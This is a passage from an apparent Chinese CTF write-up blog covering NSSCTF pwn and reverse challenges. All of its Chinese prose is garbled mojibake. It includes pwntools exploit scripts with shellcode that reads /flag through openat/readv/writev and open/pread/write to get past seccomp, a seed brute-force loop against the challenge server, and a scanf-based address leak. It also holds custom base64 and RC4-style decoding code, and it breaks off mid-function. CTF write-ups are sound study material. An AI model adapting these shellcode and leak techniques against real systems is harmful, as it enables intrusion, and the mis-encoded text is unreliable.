æ€»ç»“èµ·æ¥ï¼Œå¦‚æœ<code>pathname</code>æ˜¯ç»å¯¹è·¯å¾„ï¼Œåˆ™<code>dirfd</code>å‚æ•°æ²¡ç”¨ã€‚å¦‚æœ<code>pathname</code>æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œå¹¶ä¸”<code>dirfd</code>çš„å€¼ä¸æ˜¯<code>AT_FDCWD</code>ï¼Œåˆ™<code>pathname</code>çš„å‚ç…§ç‰©æ˜¯ç›¸å¯¹äº<code>dirfd</code>æŒ‡å‘çš„ç›®å½•ï¼Œè€Œä¸æ˜¯è¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•ï¼›åä¹‹ï¼Œå¦‚æœ<code>dirfd</code>çš„å€¼æ˜¯<code>AT_FDCWD</code>ï¼Œ<code>pathname</code>åˆ™æ˜¯ç›¸å¯¹äºè¿›ç¨‹å½“å‰å·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼Œæ­¤æ—¶ç­‰åŒäº<code>open</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åŠŸèƒ½ï¼šå°†æ•°æ®ä»æ–‡ä»¶æè¿°ç¬¦è¯»åˆ°åˆ†æ•£çš„å†…å­˜å—ä¸­ï¼Œå³åˆ†æ•£è¯»</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">readv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br><span class="line"><span class="comment">// åŠŸèƒ½ï¼šå°†å¤šå—åˆ†æ•£çš„å†…å­˜æ•°æ®ä¸€å¹¶å†™å…¥æ–‡ä»¶æè¿°ç¬¦ä¸­ï¼Œå³é›†ä¸­å†™</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">writev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">    <span class="type">void</span>  *iov_base;    <span class="comment">/* ç¼“å†²åŒºé¦–åœ°å€ */</span></span><br><span class="line">    <span class="type">size_t</span> iov_len;     <span class="comment">/*ç¼“å†²åŒºé•¿åº¦ */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>  readvï¼ˆï¼‰ç³»ç»Ÿè°ƒç”¨å°†ä»fdè¯»å…¥çš„æ•°æ®æŒ‰ä¸€å®šé¡ºåºæ•£å¸ƒåˆ°å¤šä¸ªç¼“å†²åŒºï¼Œreadvä¼šå…ˆå¡«æ»¡ä¸€ä¸ªå†å¡«å……ä¸‹ä¸€ä¸ª</p><p>  writevï¼ˆï¼‰ä¼šæŒ‰é¡ºåºï¼Œä»å„ä¸ªç¼“å†²åŒºä¸­èšé›†è¾“å‡ºæ•°æ®åˆ°fd</p></blockquote><p>ç¨‹åºåœ¨0x10000åˆ°0x11000æœ‰wxæƒé™ï¼Œä¸å¦¨ç›´æ¥å†™åœ¨è¿™ä¸Šé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.openat(<span class="number">0</span>, <span class="string">b&quot;/flag&quot;</span>, <span class="number">0</span>))</span><br><span class="line">payload += asm(shellcraft.readv(<span class="number">3</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload += asm(shellcraft.writev(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x10700</span>) + p64(<span class="number">0x40</span>) <span class="comment"># readvå’Œwritevçš„iovéƒ½æŒ‡å‘è¿™é‡Œï¼Œè¿™é‡Œèµ·å§‹åœ°å€å’Œå¤§å°å¯ä»¥éšæ„è®¾ç½®</span></span><br><span class="line">payload += asm(shellcraft.exit(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>readvå’Œwritevçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ç»“æ„ä½“æŒ‡é’ˆï¼Œè¿™é‡ŒæŒ‡å‘0x10100ï¼Œç„¶åæˆ‘ä»¬åœ¨0x10100çš„ä½ç½®ä¼ªé€ ä¸€ä¸ªç»“æ„ä½“ï¼›ç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®1æ˜¯å› ä¸ºæˆ‘ä»¬åªéœ€è¦ä¸€å—ç¼“å†²åŒºå°±å¤Ÿäº†ã€‚</p><h3 id="å®Œæ•´expï¼ˆè¿œç¨‹ï¼‰ï¼š"><a href="#å®Œæ•´expï¼ˆè¿œç¨‹ï¼‰ï¼š" class="headerlink" title="å®Œæ•´expï¼ˆè¿œç¨‹ï¼‰ï¼š"></a>å®Œæ•´expï¼ˆè¿œç¨‹ï¼‰ï¼š</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;node5.anna.nssctf.cn&#x27;, 28397)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#random.seed(0)</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line">step_arr = []</span><br><span class="line">sd = <span class="number">0</span></span><br><span class="line"><span class="comment"># payloadæå‰æ”¾åœ¨è¿™é‡Œæ˜¯å› ä¸ºç¼–è¯‘è¦æ—¶é—´ï¼Œæ”¾åœ¨åé—¨å¯èƒ½ä¼šalarm clock(é—®å°±æ˜¯è¢«è¿«å¤šè·‘äº†ä¸€éï¼Œè¿œç¨‹çœŸTMæ…¢)</span></span><br><span class="line">payload = asm(shellcraft.openat(<span class="number">0</span>, <span class="string">b&quot;/flag&quot;</span>, <span class="number">0</span>))<span class="comment"># å»ºè®®å†™ç»å¯¹åœ°å€ï¼Œç†ç”±çœ‹ä¸Šé¢openaté‚£é‡Œ</span></span><br><span class="line">payload += asm(shellcraft.readv(<span class="number">3</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload += asm(shellcraft.writev(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x10700</span>) + p64(<span class="number">0x40</span>)</span><br><span class="line">payload += asm(shellcraft.exit(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># å‘ç°æ¯æ¬¡è¿æ¥è¿·å®«éƒ½ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨æœ¬åœ°è·‘å‡ºæ¥çš„è·¯çº¿æ¥è·‘ï¼Œè¦é‡æ–°æ¢è·¯</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">28821</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;That&#x27;s all\n&quot;</span>)</span><br><span class="line">    random.seed(sd)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;xenny&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> io.recvline() <span class="keyword">and</span> step &lt; <span class="number">150</span>:</span><br><span class="line">        choice = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">        step += <span class="number">1</span></span><br><span class="line">        step_arr.append(choice)</span><br><span class="line">        log.info(<span class="string">&#x27;step: %d&#x27;</span> % step)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(step_arr) == <span class="number">150</span>:</span><br><span class="line">        sd += <span class="number">1</span></span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        step_arr = []</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step_arr: &#x27;</span>, step_arr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;seed:&#x27;</span>, sd)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span> - <span class="number">2</span> * <span class="built_in">len</span>(step_arr)):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> step_arr:</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">res = io.recvuntil(<span class="string">b&quot;don&#x27;t forget your flag\n&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Pwn-happy2"><a href="#Pwn-happy2" class="headerlink" title="Pwn-happy2"></a>Pwn-happy2</h2><p><em><strong>é™„ä»¶ï¼š</strong></em><a href="../resources/pwn_asset/2023-8/happy2" target="_block">happy2</a></p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/happy2_proof.png" alt="happy2_proof" style="zoom:80%;"><p>è¦ç»•è¿‡æœ€åçš„ä¸€ä¸ªåˆ¤æ–­ï¼Œæ˜¾ç„¶æ˜¯è¦é€šè¿‡å‰é¢çš„printfæ³„éœ²putsçš„åœ°å€</p><p>å¯ä»¥åˆ©ç”¨scanfåœ¨è¯»å–éæ•°å­—å­—ç¬¦æ—¶ï¼Œä¸ä¼šè¿”å›å€¼çš„ç‰¹æ€§ï¼Œè¿™é‡Œè¾“å…¥â€™+â€™å·ï¼Œå°±å¯ä»¥æ³„éœ²æ ˆä¸­çš„æ•°æ®äº†ï¼ŒåŠ¨è°ƒå‘ç°ç¬¬äºŒä¸ªæ•°æ®æ˜¯stderrçš„åœ°å€ï¼Œæ‰€ä»¥æ³„éœ²stderråœ°å€ï¼Œå†æ ¹æ®stderrå’Œputsçš„åç§»ç®—å‡ºputsåœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&#x27;konw\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">1</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">stderr = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;you&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">exit_addr = stderr - <span class="number">0x1997d0</span><span class="comment"># è¿™é‡Œåªç®—äº†æœ¬æœºçš„åç§»ï¼Œè¿œç¨‹åº”è¯¥ä¸åŒ</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;have a try\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(exit_addr).encode())</span><br></pre></td></tr></table></figure><p>ç„¶åmainé‡Œçš„æ€è·¯æ˜¯orw</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/happy2_main.png" alt="happy2_main" style="zoom: 80%;"><p>ç”¨seccomp-tools dumpä¸€ä¸‹ï¼Œbanäº†execveï¼Œforkï¼Œconnectï¼Œreadï¼ˆæ®è¯´é™„ä»¶ç»™é”™äº†ï¼ŒåŸæœ¬è¦bançš„æ˜¯readvï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œå°±ç”¨openï¼Œpreadï¼Œwriteæ¥æ‹¿åˆ°flagï¼ˆæ€è·¯å’Œä¸Šä¸€é¢˜å·®ä¸å¤šï¼Œä¸ç»†è®²äº†ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">payload = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.pread(<span class="number">3</span>, <span class="number">0x10100</span>, <span class="number">0x30</span>, <span class="number">0</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">0x30</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x10400</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><h2 id="Re-MyBase"><a href="#Re-MyBase" class="headerlink" title="Re-MyBase"></a>Re-MyBase</h2><p><em><strong>é™„ä»¶ï¼š</strong></em><a href="../resources/pwn_asset/2023-8/myBase.exe" target="_block">myBase.exe</a></p><h3 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h3><p>æ¢è¡¨base64ï¼Œå‘ç°æ¯æ¬¡baseåŠ å¯†éƒ½åˆ©ç”¨éšæœºæ•°é‡æ–°ç”Ÿæˆäº†ä¸€ä¸ªæ–°è¡¨ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥å¤åˆ»ä»£ç é€»è¾‘ç”¨ctypeæ¥å¤åŸç”¨è¿‡çš„è¡¨ã€‚</p><p>æˆ‘è¿™é‡Œæ˜¯ç›´æ¥åŠ¨è°ƒæŠŠè¡¨æ‰’ä¸‹æ¥</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">CLASSIC_TABLE = <span class="string">b&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64decode</span>(<span class="params">enc: <span class="built_in">str</span>|<span class="built_in">bytes</span>, key: <span class="built_in">str</span>|<span class="built_in">bytes</span> = CLASSIC_TABLE</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(enc, <span class="built_in">str</span>):</span><br><span class="line">        enc = enc.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(key, <span class="built_in">str</span>):</span><br><span class="line">        key = key.encode()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) == <span class="number">65</span>:</span><br><span class="line">        padding = key[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">len</span>(key) == <span class="number">64</span>:</span><br><span class="line">        padding = (<span class="built_in">set</span>(CLASSIC_TABLE) - <span class="built_in">set</span>(key)).pop()</span><br><span class="line">        key += <span class="built_in">bytes</span>([padding])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid key length&quot;</span>)</span><br><span class="line">    msg = []</span><br><span class="line">    l = <span class="built_in">len</span>(enc)</span><br><span class="line">    <span class="keyword">if</span> l % <span class="number">4</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid base64code length&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, l, <span class="number">4</span>):</span><br><span class="line">        buf = key.index(enc[i]) &lt;&lt; <span class="number">18</span> | key.index(enc[i+<span class="number">1</span>]) &lt;&lt; <span class="number">12</span> | key.index(enc[i+<span class="number">2</span>]) &lt;&lt; <span class="number">6</span> | key.index(enc[i+<span class="number">3</span>])</span><br><span class="line">        msg.append(buf &gt;&gt; <span class="number">16</span>)</span><br><span class="line">        msg.append((buf &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>)</span><br><span class="line">        msg.append(buf &amp; <span class="number">0xff</span>)</span><br><span class="line">    <span class="keyword">if</span> enc[-<span class="number">1</span>] == padding:</span><br><span class="line">        msg.pop()</span><br><span class="line">        <span class="keyword">if</span> enc[-<span class="number">2</span>] == padding:</span><br><span class="line">            msg.pop()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(msg)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&#x27;YkLYv1Xj23X7N0E5eoFgUveKeos1XS8K9r4g&#x27;</span></span><br><span class="line">key = [</span><br><span class="line">    <span class="string">&#x27;+86420ywusqomkigecaYWUSQOMKIGECABDFHJLNPRTVXZbdfhjlnprtvxz13579/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YsVO0tvT2o4puZ38j1dwf7MArGPNeQLDRHUK+SChbFanmklWEcgixXJIq6y5B/9z=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;YvHeOZECmTyg0Mw2i7PIGKblsfF59rzUk6p3hVdW1qaQ+xRANnXLj48BcJDotS/u=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xDfpNE4LYH5Tk+MRtrlv1oFbQm0gP37eqIajh2syUnZcSV8iBK6O/XWuzdCwA9GJ=&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">    <span class="comment"># æ²¡æœ‰ç»†çœ‹æ–‡ä»¶ä¸­çš„base64encodeä»£ç ï¼Œåœ¨åŠ¨è°ƒè¿‡ç¨‹ä¸­å‘ç°åŠ å¯†ç”Ÿæˆçš„å­—ç¬¦ä¸²é¡ºåºæ˜¯åçš„ï¼Œæ‰€ä»¥è¿™é‡Œåè¿‡æ¥å†ä¼ å‚</span></span><br><span class="line">    flag += b64decode(enc[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>][::-<span class="number">1</span>], k)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># NSSCTF&#123;Welc0me_T0_Re_World&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Re-Bytecode"><a href="#Re-Bytecode" class="headerlink" title="Re-Bytecode"></a>Re-Bytecode</h2><p><em><strong>é™„ä»¶ï¼š</strong></em><a href="../resources/pwn_asset/2023-8/Bytecode.txt" target="_block">Bytecode.txt</a></p><p><em>å­—èŠ‚ç ï¼Œç›´æ¥æ‰‹æ“ï¼ï¼ï¼</em></p><h3 id="å¤åŸä»£ç ï¼š"><a href="#å¤åŸä»£ç ï¼š" class="headerlink" title="å¤åŸä»£ç ï¼š"></a>å¤åŸä»£ç ï¼š</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">key</span>):</span><br><span class="line">    x = [<span class="number">78</span>, <span class="number">82</span>, <span class="number">81</span>, <span class="number">64</span>, <span class="number">80</span>, <span class="number">67</span>, <span class="number">125</span>, <span class="number">83</span>, <span class="number">96</span>, <span class="number">56</span>, <span class="number">121</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">126</span>, <span class="number">81</span>, <span class="number">79</span>, <span class="number">79</span>, <span class="number">119</span>, <span class="number">38</span>, <span class="number">120</span>, <span class="number">39</span>, <span class="number">74</span>, <span class="number">112</span>, <span class="number">38</span>, <span class="number">44</span>, <span class="number">126</span>, <span class="number">103</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="built_in">len</span>(x):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong length!&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(key[i]) ^ i != x[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">    s_box[j], s_box[i] = s_box[i], s_box[j]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">msg</span>):</span><br><span class="line">    key = <span class="string">&quot;Just kidding, don&#x27;t take it personally!&quot;</span></span><br><span class="line">    x = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        x.append(<span class="built_in">ord</span>(msg[i]) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">        x[i] = (x[i] ^ i) &gt;&gt; <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">msg, s_box</span>):</span><br><span class="line">    x = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(msg[k] ^ s_box[t])</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">msg, s_box, key</span>):</span><br><span class="line">    x = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        t = (s_box[i] + s_box[j]) % <span class="number">256</span></span><br><span class="line">        x.append(<span class="built_in">ord</span>(msg[k]) ^ s_box[t] ^ <span class="built_in">ord</span>(key[i]))</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, s_box</span>):</span><br><span class="line">    x = []</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span 